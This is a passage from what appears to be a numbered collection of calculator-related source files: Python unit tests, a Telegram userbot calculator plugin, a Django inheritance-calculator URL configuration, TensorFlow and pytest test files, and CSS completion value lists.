def test_elevar_0_al_5(self):\n        result = self.calc.potencia(0, 5)\n        self.assertEqual(0, result)\n\n    def test_elevar_11_al_0(self):\n        result = self.calc.potencia(11, 0)\n        self.assertEqual(1, result)\n\n    def test_elevar_10_al_2(self):\n        result = self.calc.potencia(10, 2)\n        self.assertEqual(100, result)\n\n    def test_elevar_2_al_menos2(self):\n        result = self.calc.potencia(2, -2)\n        self.assertEqual(0.25, result)\n\n    def test_elevar_menos2_al_menos2(self):\n        result = self.calc.potencia(-2, -2)\n        self.assertEqual(0.25, result)\n\n    def test_elevar_menos2_al_2(self):\n        result = self.calc.potencia(-2, 2)\n        self.assertEqual(4, result)\n\n    def test_elevar_2punto5_al_2(self):\n        result = self.calc.potencia(2.5, 2)\n        self.assertEqual(6.25, result)\n\n    def test_elevar_x_al_menos3(self):\n        result = self.calc.potencia('x', -3)\n        self.assertEqual(\"Solo numeros\", result)\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "534": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "535": "\"\"\"mawareeth URL Configuration\n\nThe `urlpatterns` list routes URLs to views. For more information please see:\n    https://docs.djangoproject.com/en/3.0/topics/http/urls/\nExamples:\nFunction views\n    1. Add an import:  from my_app import views\n    2. Add a URL to urlpatterns:  path('', views.home, name='home')\nClass-based views\n    1. Add an import:  from other_app.views import Home\n    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')\nIncluding another URLconf\n    1. Import the include() function: from django.urls import include, path\n    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))\n\"\"\"\nfrom django.conf.urls.i18n import i18n_patterns\nfrom django.contrib import admin\nfrom django.urls import include, path\nfrom calc import views as calc_views\nfrom user_auth import views as user_auth_views\n\nurlpatterns = [\n    #path('admin/', admin.site.urls),\n    #path('calc/', include('calc.urls')),\n    path('i18n/', include('django.conf.urls.i18n')),\n    path('accounts/', include('django.contrib.auth.urls')),\n    path('social-auth/', include('social_django.urls', namespace=\"social\")),\n\n]\n\ncalc_patterns = ([\n    path('calc/', calc_views.IndexView.as_view(), name='index'),\n    path('', calc_views.HomePage.as_view(), name='home'),\n\tpath('terms/', calc_views.Terms.as_view(), name='terms'),\n\tpath('privacy/', calc_views.Privacy.as_view(), name='privacy'),\n    path('about/', calc_views.About.as_view(), name='about'),\n    path('new/', calc_views.new, name='new'),\n    path('/', calc_views.DetailView.as_view(), name='detail'),\n    path('/delete/', calc_views.delete, name='delete'),\n    path('/deceased', calc_views.DeceasedCreate.as_view(), name='deceased'),\n\tpath('/deceased_delete', calc_views.DeceasedDelete.as_view(), name='deceased_delete'),\n\tpath('/deceased_update', calc_views.DeceasedUpdate.as_view(), name='deceased_update'),\n\tpath('/calc_update', calc_views.CalculationUpdate.as_view(), name='calc_update'),\n    path('/mother', calc_views.MotherCreate.as_view(), name='mother'),\n\tpath('/heir_delete', calc_views.HeirDelete.as_view(), name='heir_delete'),\n\tpath('/heir_update', calc_views.HeirUpdate.as_view(), name='heir_update'),\n    path('/father', calc_views.FatherCreate.as_view(), name='father'),\n\tpath('/husband', calc_views.HusbandCreate.as_view(), name='husband'),\n\tpath('/wife', calc_views.WifeCreate.as_view(), name='wife'),\n\tpath('/daughter', calc_views.DaughterCreate.as_view(), name='daughter'),\n\tpath('/son', calc_views.SonCreate.as_view(), name='son'),\n\tpath('/bother', calc_views.BrotherCreate.as_view(), name='brother'),\n\tpath('/sister', calc_views.SisterCreate.as_view(), name='sister'),\n\tpath('/grandFather', calc_views.GrandFatherCreate.as_view(), name='grandFather'),\n\tpath('/grandMother', calc_views.GrandMotherCreate.as_view(), name='grandMother'),\n\tpath('/sonOfSon', calc_views.SonOfSonCreate.as_view(), name='sonOfSon'),\n\tpath('/daughterOfSon', calc_views.DaughterOfSonCreate.as_view(), name='daughterOfSon'),\n\tpath('/paternalSister', calc_views.PaternalSisterCreate.as_view(), name='paternalSister'),\n\tpath('/paternalBrother', calc_views.PaternalBrotherCreate.as_view(), name='paternalBrother'),\n\tpath('/maternalSister', calc_views.MaternalSisterCreate.as_view(), name='maternalSister'),\n\tpath('/maternalBrother', calc_views.MaternalBrotherCreate.as_view(), name='maternalBrother'),\n\tpath('/sonOfBrother', calc_views.SonOfBrotherCreate.as_view(), name='sonOfBrother'),\n\tpath('/sonOfPaternalBrother', calc_views.SonOfPaternalBrotherCreate.as_view(), name='sonOfPaternalBrother'),\n\tpath('/uncle', calc_views.UncleCreate.as_view(), name='uncle'),\n\tpath('/paternalUncle', calc_views.PaternalUncleCreate.as_view(), name='paternalUncle'),\n\tpath('/sonOfUncle', calc_views.SonOfUncleCreate.as_view(), name='sonOfUncle'),\n\tpath('/sonOfPaternalUncle', calc_views.SonOfPaternalUncleCreate.as_view(), name='sonOfPaternalUncle'),\n    path('/results/', calc_views.ResultsView.as_view(), name='results'),\n    path('/new-results/', calc_views.NewResultsView.as_view(), name='new_results'),\n    path('error/', calc_views.error, name='error'),\n    path('signup/', calc_views.SignUp.as_view(), name='signup'),\n\n\n], 'calc')\n\nuser_auth_patterns = ([\n    path('profile/', user_auth_views.profile, name='profile')\n], 'user_auth')\nurlpatterns += i18n_patterns(\n    path('admin/', admin.site.urls),\n    path('', include(calc_patterns,namespace='calc')),\n    path('',include(user_auth_patterns,namespace='user_auth')),\n)\n", "536": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "537": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# \u6d4b\u8bd5\u4ee3\u7801\nimport allure\nimport pytest\nimport sys\n\nsys.path.append('..')\n\nfrom pythoncode.calc import Calculator\n\n\n# \u6587\u4ef6\u7684\u540d\u5b57\u8981\u4ee5test_\u5f00\u5934\n# \u7c7b\u540d\u8981\u4ee5Test\u5f00\u5934 \u9996\u5b57\u6bcd\u5927\u5199\uff0c \u65b9\u6cd5\u540d\u8981\u4ee5test_\u5f00\u5934\nclass TestCalc:\n    # setup_class \u662f\u7c7b\u7ea7\u522b\u7684\n    def setup_class(self):\n        print(\"TestCalc \u5728\u6574\u4e2a\u7c7b\u7684\u524d\u6267\u884csetup_class\")\n        self.calc = Calculator()\n\n    def teardown_class(self):\n        print(\"TestCalc\u5728\u6574\u4e2a\u7c7b\u7684\u540e\u6267\u884cteardown_class\")\n\n    # setup \u662f\u65b9\u6cd5\u7ea7\u522b\u7684\n    def setup(self):\n        print(\"\u6d4b\u8bd5\u7528\u4f8b\u6267\u884c\u4e4b\u524d\u6267\u884csetup\")\n        self.calc = Calculator()\n\n    def teardown(self):\n        print(\"\u6d4b\u8bd5\u7528\u4f8b\u6267\u884c\u4e4b\u540e\u6267\u884cteardown\")\n\n    @pytest.mark.parametrize('a,b,c', [\n        (1, 1, 2),\n        (0.1, 0.1, 0.2),\n        (-1, -1, -2),\n        (100, 100, 200),\n        (100, -100, 150),\n        (1, 0.1, 1.1)\n    ])\n    def test_add(self, a, b, c):\n        # calc = Calculator()\n        allure.attach(\"\u8fd9\u662f\u4e00\u4e2a\u76f8\u52a0\u7684\u6d4b\u8bd5\u7528\u4f8b\", name='\u8fd9\u662f\u6587\u672c\u578b',\n                      attachment_type=allure.attachment_type.TEXT)\n        allure.attach(\n            '',\n            name='html\u7c7b\u578b',\n            attachment_type=allure.attachment_type.HTML)\n        assert c == self.calc.add(a, b)\n\n    def test_add1(self):\n        datalist = [\n            (1, 1, 2),\n            (0.1, 0.1, 0.2),\n            (-1, -1, -2),\n            (100, 100, 200),\n            (100, -100, 150),\n            (10000, 10000, 20000)\n        ]\n        for data in datalist:\n            # calc = Calculator()\n            assert data[2] == self.calc.add(data[0], data[1])\n\n    # def test_add2(self):\n    #     calc = Calculator()\n    #     assert -2 == calc.add(-1,-1)\n\n    def test_div(self):\n        # calc = Calculator()\n        assert 1 == self.calc.div(1, 1)\n\n    def test_image(self):\n        allure.attach.file('/Users/juanxu/Documents/\u970d\u683c\u6c83\u5179\u57f9\u8bad/\u516c\u5f00\u8bfe/\u57fa\u7840\u516c\u5f00\u8bfe\u6d3b\u7801/gkkxx.png',\n                           name='\u56fe\u7247', attachment_type=allure.attachment_type.PNG)\n        allure.attach.file('/Users/juanxu/Documents/\u970d\u683c\u6c83\u5179\u57f9\u8bad/02\u5f55\u64ad\u8bfe\u7a0b/python/python\u7b2c\u4e09\u65b9\u5e93/python\u7b2c\u4e09\u65b9\u5e93.mp4',\n                           name='\u89c6\u9891', attachment_type=allure.attachment_type.MP4)\n\n\nclass TestCalcDemo:\n    def setup_class(self):\n        print(\"TestCalcDemo \u5728\u6574\u4e2a\u7c7b\u7684\u524d\u6267\u884csetup_class\")\n        self.calc = Calculator()\n\n    def teardown_class(self):\n        print(\"TestCalcDemo \u5728\u6574\u4e2a\u7c7b\u7684\u540e\u6267\u884cteardown_class\")\n\n    def test_add1(self):\n        print(\"\u6d4b\u8bd5\u76f8\u52a0\")\n\n    def div(self):\n        print(\"\u6d4b\u8bd5\u76f8\u9664\")\n\n\nclass TestCalcDemo:\n    def setup_class(self):\n        print(\"setup_class\")\n\n    def teardown_class(self):\n        print(\"teardown_class\")\n\n    def test_add1(self):\n        print(\"\u6d4b\u8bd5\u76f8\u52a0\")\n\n    def div(self):\n        print(\"\u6d4b\u8bd5\u76f8\u9664\")\n", "538": "#!/usr/bin/python3\n\nimport unittest\n\nfrom fib import calc_fibonacci\n\nclass CalcFibonacciTestCase(unittest.TestCase):\n\n    @unittest.expectedFailure\n    def test_with_preceeding_lower_bound(self):\n        calc_fibonacci(-1)\n\n    def test_with_n_as_0(self):\n        self.assertEqual(0, calc_fibonacci(0))\n\n    def test_with_n_as_1(self):\n        self.assertEqual(1, calc_fibonacci(1))\n\n    def test_with_n_as_2(self):\n        self.assertEqual(1, calc_fibonacci(2))\n\n    def test_with_n_as_3(self):\n        self.assertEqual(2, calc_fibonacci(3))\n\n    def test_with_n_as_4(self):\n        self.assertEqual(3, calc_fibonacci(4))\n\n    def test_with_n_as_5(self):\n        self.assertEqual(5, calc_fibonacci(5))\n\n    def test_with_n_as_6(self):\n        self.assertEqual(8, calc_fibonacci(6))\n\n    def test_with_n_as_7(self):\n        self.assertEqual(13, calc_fibonacci(7))\n\n    def test_with_n_as_8(self):\n        self.assertEqual(21, calc_fibonacci(8))\n\n    def test_with_n_as_9(self):\n        self.assertEqual(34, calc_fibonacci(9))\n\n    def test_with_n_as_10(self):\n        self.assertEqual(55, calc_fibonacci(10))\n\n    def test_with_n_as_20(self):\n        self.assertEqual(6765, calc_fibonacci(20))\n\n    def test_with_n_as_30(self):\n        self.assertEqual(832040, calc_fibonacci(30))\n\n    def test_with_n_as_40(self):\n        self.assertEqual(102334155, calc_fibonacci(40))\n\n    def test_with_n_as_45(self):\n        self.assertEqual(1134903170, calc_fibonacci(45))\n\nif __name__ == '__main__':\n    unittest.main()\n", "539": "# Two main variables are taken from repository:\n# https://github.com/sublimehq/Packages/blob/master/CSS/\n# which has the following license:\n#############\n# If not otherwise specified (see below), files in this repository fall under the following license:\n#\n#     Permission to copy, use, modify, sell and distribute this\n#     software is granted. This software is provided \"as is\" without\n#     express or implied warranty, and with no claim as to its\n#     suitability for any purpose.\n#\n# An exception is made for files in readable text which contain their own license information, or files where an accompanying file exists (in the same directory) with a \u201c-license\u201d suffix added to the base-name name of the original file, and an extension of txt, html, or similar. For example \u201ctidy\u201d is accompanied by \u201ctidy-license.txt\u201d.\n#############\n\ncommon_values = {\n        \"animation-direction\": [\"alternate\", \"alternate-reverse\", \"normal\", \"reverse\"],\n        \"absolute-size\": [\n            \"xx-small\",\n            \"x-small\",\n            \"small\",\n            \"medium\",\n            \"large\",\n            \"x-large\",\n            \"xx-large\",\n        ],\n        \"absolute-weight\": [\n            \"100\",\n            \"200\",\n            \"300\",\n            \"400\",\n            \"500\",\n            \"600\",\n            \"700\",\n            \"800\",\n            \"900\",\n            \"normal\",\n            \"bold\",\n        ],\n        \"basic-shape\": [\n            [\"circle()\", \"circle($1)\"],\n            [\"ellipse()\", \"ellipse($1)\"],\n            [\"inset()\", \"inset($1)\"],\n            [\"polygon()\", \"polygon($1)\"],\n        ],\n        \"blend-mode\": [\n            \"normal\",\n            \"multiply\",\n            \"screen\",\n            \"overlay\",\n            \"darken\",\n            \"lighten\",\n            \"color-dodge\",\n            \"color-burn\",\n            \"hard-light\",\n            \"soft-light\",\n            \"difference\",\n            \"exclusion\",\n            \"hue\",\n            \"saturation\",\n            \"color\",\n            \"luminosity\",\n        ],\n        \"border-style\": [\n            \"none\",\n            \"hidden\",\n            \"dotted\",\n            \"dashed\",\n            \"solid\",\n            \"double\",\n            \"groove\",\n            \"ridge\",\n            \"inset\",\n            \"outset\",\n        ],\n        \"border-width\": [\"thin\", \"medium\", \"thick\"],\n        \"break-before-after\": [\n            \"always\",\n            \"left\",\n            \"right\",\n            \"recto\",\n            \"verso\",\n            \"page\",\n            \"column\",\n            \"region\",\n        ],\n        \"break-inside\": [\"auto\", \"avoid\", \"avoid-page\", \"avoid-column\", \"avoid-region\"],\n        \"calc\": [\n            [\"calc()\", \"calc($1)\"],\n            [\"clamp()\", \"clamp(${1:0}, ${2:0}, ${3:0})\"],\n            [\"max()\", \"max(${1:0}, ${2:0})\"],\n            [\"min()\", \"min(${1:0}, ${2:0})\"],\n        ],\n        \"color\": [\n            \"currentColor\",\n            \"transparent\",\n            [\"rgb()\", \"rgb(${1:0}, ${2:0}, ${3:0})\"],\n            [\"rgba()\", \"rgba(${1:0}, ${2:0}, ${3:0}, ${4:1.0})\"],\n            [\"hsl()\", \"hsl(${1:0}, ${2:100%}, ${3:50%})\"],\n            [\"hsla()\", \"hsla(${1:0}, ${2:100%}, ${3:50%}, ${4:1.0})\"],\n            # Named colors\n            \"aliceblue\",\n            \"antiquewhite\",\n            \"aqua\",\n            \"aquamarine\",\n            \"azure\",\n            \"beige\",\n            \"bisque\",\n            \"black\",\n            \"blanchedalmond\",\n            \"blue\",\n            \"blueviolet\",\n            \"brown\",\n            \"burlywood\",\n            \"cadetblue\",\n            \"chartreuse\",\n            \"chocolate\",\n            \"coral\",\n            \"cornflowerblue\",\n            \"cornsilk\",\n            \"crimson\",\n            \"cyan\",\n            \"darkblue\",\n            \"darkcyan\",\n            \"darkgoldenrod\",\n            \"darkgray\",\n            \"darkgrey\",\n            \"darkgreen\",\n            \"darkkhaki\",\n            \"darkmagenta\",\n            \"darkolivegreen\",\n            \"darkorange\",\n            \"darkorchid\",\n            \"darkred\",\n            \"darksalmon\",\n            \"darkseagreen\",\n            \"darkslateblue\",\n            \"darkslategray\",\n            \"darkslategrey\",\n            \"darkturquoise\",\n            \"darkviolet\",\n            \"deeppink\",\n            \"deepskyblue\",\n            \"dimgray\",\n            \"dimgrey\",\n            \"dodgerblue\",\n            \"firebrick\",\n            \"floralwhite\",\n            \"forestgreen\",\n            \"fuchsia\",\n            \"gainsboro\",\n            \"ghostwhite\",\n            \"gold\",\n            \"goldenrod\",\n            \"gray\",\n            \"grey\",\n            \"green\",\n            \"greenyellow\",\n            \"honeydew\",\n            \"hotpink\",\n            \"indianred\",\n            \"indigo\",\n            \"ivory\",\n            \"khaki\",\n            \"lavender\",\n            \"lavenderblush\",\n            \"lawngreen\",\n            \"lemonchiffon\",\n            \"lightblue\",\n            \"lightcoral\",\n            \"lightcyan\",\n            \"lightgoldenrodyellow\",\n            \"lightgray\",\n            \"lightgrey\",\n            \"lightgreen\",\n            \"lightpink\",\n            \"lightsalmon\",\n            \"lightseagreen\",\n            \"lightskyblue\",\n            \"lightslategray\",\n            \"lightslategrey\",\n            \"lightsteelblue\",\n            \"lightyellow\",\n            \"lime\",\n            \"limegreen\",\n            \"linen\",\n            \"magenta\",\n            \"maroon\",\n            \"mediumaquamarine\",\n            \"mediumblue\",\n            \"mediumorchid\",\n            \"mediumpurple\",\n            \"mediumseagreen\",\n            \"mediumslateblue\",\n            \"mediumspringgreen\",\n            \"mediumturquoise\",\n            \"mediumvioletred\",\n            \"midnightblue\",\n            \"mintcream\",\n            \"mistyrose\",\n            \"moccasin\",\n            \"navajowhite\",\n            \"navy\",\n            \"oldlace\",\n            \"olive\",\n            \"olivedrab\",\n            \"orange\",\n            \"orangered\",\n            \"orchid\",\n            \"palegoldenrod\",\n            \"palegreen\",\n            \"paleturquoise\",\n            \"palevioletred\",\n            \"papayawhip\",\n            \"peachpuff\",\n            \"peru\",\n            \"pink\",\n            \"plum\",\n            \"powderblue\",\n            \"purple\",\n            \"rebeccapurple\",\n            \"red\",\n            \"rosybrown\",\n            \"royalblue\",\n            \"saddlebrown\",\n            \"salmon\",\n            \"sandybrown\",\n            \"seagreen\",\n            \"seashell\",\n            \"sienna\",\n            \"silver\",\n            \"skyblue\",\n            \"slateblue\",\n            \"slategray\",\n            \"slategrey\",\n            \"snow\",\n            \"springgreen\",\n            \"steelblue\",\n            \"tan\",\n            \"teal\",\n            \"thistle\",\n            \"tomato\",\n            \"turquoise\",\n            \"violet\",\n            \"wheat\",\n            \"white\",\n            \"whitesmoke\",\n            \"yellow\",\n            \"yellowgreen\",\n        ],\n        \"counter-style\": [[\"symbols()\", \"symbols($1)\"]],\n        \"counter-symbols\": [\n            \"cyclic\",\n            \"numeric\",\n            \"alphabetic\",\n            \"symbolic\",\n            \"additive\",\n            \"fixed\",\n        ],\n        \"ending-shape\": [\"circle\", \"ellipse\"],\n        \"fill-rule\": [\"nonzero\", \"evenodd\"],\n        \"filter-function\": [\n            [\"blur()\", \"blur($1)\"],\n            [\"brightness()\", \"brightness($1)\"],\n            [\"contrast()\", \"contrast($1)\"],\n            [\"drop-shadow()\", \"drop-shadow($1)\"],\n            [\"grayscale()\", \"grayscale($1)\"],\n            [\"hue-rotate()\", \"hue-rotate($1)\"],\n            [\"invert()\", \"invert($1)\"],\n            [\"opacity()\", \"opacity($1)\"],\n            [\"saturate()\", \"saturate($1)\"],\n            [\"sepia()\", \"sepia($1)\"],\n        ],\n        \"font-variant-alternates\": [\n            \"normal\",\n            \"historical-forms\",\n            [\"stylistic()\", \"stylistic($1)\"],\n            [\"styleset()\", \"styleset($1)\"],\n            [\"character-variant()\", \"character-variant($1)\"],\n            [\"swash()\", \"swash($1)\"],\n            [\"ornaments()\", \"ornaments($1)\"],\n            [\"annotation()\", \"annotation($1)\"],\n        ],\n        \"generic-font-name\": [\n            \"serif\",\n            \"sans-serif\",\n            \"cursive\",\n            \"fantasy\",\n            \"monospace\",\n        ],\n        \"gradient\": [\n            [\"conic-gradient()\", \"conic-gradient($1)\"],\n            [\"linear-gradient()\", \"linear-gradient($1)\"],\n            [\"radial-gradient()\", \"radial-gradient($1)\"],\n            [\"repeating-conic-gradient()\", \"repeating-conic-gradient($1)\"],\n            [\"repeating-linear-gradient()\", \"repeating-linear-gradient($1)\"],\n            [\"repeating-radial-gradient()\", \"repeating-radial-gradient($1)\"],\n        ],\n        \"grid\": [\n            [\"repeat()\", \"repeat(${1:2}, ${2:1fr})\"],\n            [\"minmax()\", \"minmax(${1:100px}, ${2:1fr})\"],\n        ],\n        \"image\": [\n            \"\",\n            [\"image()\", \"image($1)\"],\n            [\"image-set()\", \"image-set($1)\"],\n            [\"element()\", \"element($1)\"],\n            [\"paint()\", \"paint($1)\"],\n            [\"cross-fade()\", \"cross-fade($1)\"],\n            [\"linear-gradient()\", \"linear-gradient($1)\"],\n            [\"repeating-linear-gradient()\", \"repeating-linear-gradient($1)\"],\n            [\"radial-gradient()\", \"radial-gradient($1)\"],\n            [\"repeating-radial-gradient()\", \"repeating-radial-gradient($1)\"],\n            [\"conic-gradient()\", \"conic-gradient($1)\"],\n        ],\n        \"image-tags\": [\"ltr\", \"rtl\"],\n        \"line-style\": [\n            \"none\",\n            \"hidden\",\n            \"dotted\",\n            \"dashed\",\n            \"solid\",\n            \"double\",\n            \"groove\",\n            \"ridge\",\n            \"inset\",\n            \"outset\",\n        ],\n        \"leader-type\": [\"dotted\", \"solid\", \"space\"],\n        \"list-style-type\": [\n            \"none\",\n            \"inline\",\n            \"disc\",\n            \"circle\",\n            \"square\",\n            \"decimal\",\n            \"decimal-leading-zero\",\n            \"arabic-indic\",\n            \"binary\",\n            \"bengali\",\n            \"cambodian\",\n            \"khmer\",\n            \"devanagari\",\n            \"gujarati\",\n            \"gurmukhi\",\n            \"kannada\",\n            \"lower-hexadecimal\",\n            \"lao\",\n            \"malayalam\",\n            \"mongolian\",\n            \"myanmar\",\n            \"octal\",\n            \"oriya\",\n            \"persian\",\n            \"urdu\",\n            \"telugu\",\n            \"tibetan\",\n            \"thai\",\n            \"upper-hexadecimal\",\n            \"lower-roman\",\n            \"upper-roman\",\n            \"lower-greek\",\n            \"lower-alpha\",\n            \"lower-latin\",\n            \"upper-alpha\",\n            \"upper-latin\",\n            \"afar\",\n            \"ethiopic-halehame-aa-et\",\n            \"ethiopic-halehame-aa-er\",\n            \"amharic\",\n            \"ethiopic-halehame-am-et\",\n            \"amharic-abegede\",\n            \"ethiopic-abegede-am-et\",\n            \"cjk-earthly-branch\",\n            \"cjk-heavenly-stem\",\n            \"ethiopic\",\n            \"ethiopic-halehame-gez\",\n            \"ethiopic-abegede\",\n            \"ethiopic-abegede-gez\",\n            \"hangul-consonant\",\n            \"hangul\",\n            \"lower-norwegian\",\n            \"oromo\",\n            \"ethiopic-halehame-om-et\",\n            \"sidama\",\n            \"ethiopic-halehame-sid-et\",\n            \"somali\",\n            \"ethiopic-halehame-so-et\",\n            \"tigre\",\n            \"ethiopic-halehame-tig\",\n            \"tigrinya-er\",\n            \"ethiopic-halehame-ti-er\",\n            \"tigrinya-er-abegede\",\n            \"ethiopic-abegede-ti-er\",\n            \"tigrinya-et\",\n            \"ethiopic-halehame-ti-et\",\n            \"tigrinya-et-abegede\",\n            \"ethiopic-abegede-ti-et\",\n            \"upper-greek\",\n            \"upper-norwegian\",\n            \"asterisks\",\n            \"footnotes\",\n            \"hebrew\",\n            \"armenian\",\n            \"lower-armenian\",\n            \"upper-armenian\",\n            \"georgian\",\n            \"cjk-ideographic\",\n            \"hiragana\",\n            \"katakana\",\n            \"hiragana-iroha\",\n            \"katakana-iroha\",\n        ],\n        \"position\": [\"\", \"center\"],\n        \"relative-size\": [\"larger\", \"smaller\"],\n        \"relative-weight\": [\"bolder\", \"lighter\"],\n        \"repeat-style\": [\n            \"repeat\",\n            \"repeat-x\",\n            \"repeat-y\",\n            \"space\",\n            \"round\",\n            \"no-repeat\",\n        ],\n        \"self-position\": [\n            \"center\",\n            \"start\",\n            \"end\",\n            \"self-start\",\n            \"self-end\",\n            \"flex-start\",\n            \"flex-end\",\n        ],\n        \"shape-radius\": [\"closest-side\", \"farthest-side\"],\n        \"side-or-corner\": [\"left\", \"right\", \"top\", \"bottom\"],\n        \"timing-function\": [\n            \"linear\",\n            \"ease\",\n            \"ease-in\",\n            \"ease-out\",\n            \"ease-in-out\",\n            \"step-start\",\n            \"step-end\",\n            [\"cubic-bezier()\", \"cubic-bezier(${1:0.0}, ${2:0.0}, ${3:1.0}, ${4:1.0})\"],\n            [\"steps()\", \"steps(${1:2}, ${2:start})\"],\n        ],\n        \"type-or-unit\": [\n            \"string\",\n            \"color\",\n            \"url\",\n            \"integer\",\n            \"number\",\n            \"length\",\n            \"angle\",\n            \"time\",\n            \"frequency\",\n            \"cap\",\n            \"ch\",\n            \"em\",\n            \"ex\",\n            \"ic\",\n            \"lh\",\n            \"rlh\",\n            \"rem\",\n            \"vb\",\n            \"vi\",\n            \"vw\",\n            \"vh\",\n            \"vmin\",\n            \"vmax\",\n            \"mm\",\n            \"Q\",\n            \"cm\",\n            \"in\",\n            \"pt\",\n            \"pc\",\n            \"px\",\n            \"deg\",\n            \"grad\",\n            \"rad\",\n            \"turn\",\n            \"ms\",\n            \"s\",\n            \"Hz\",\n            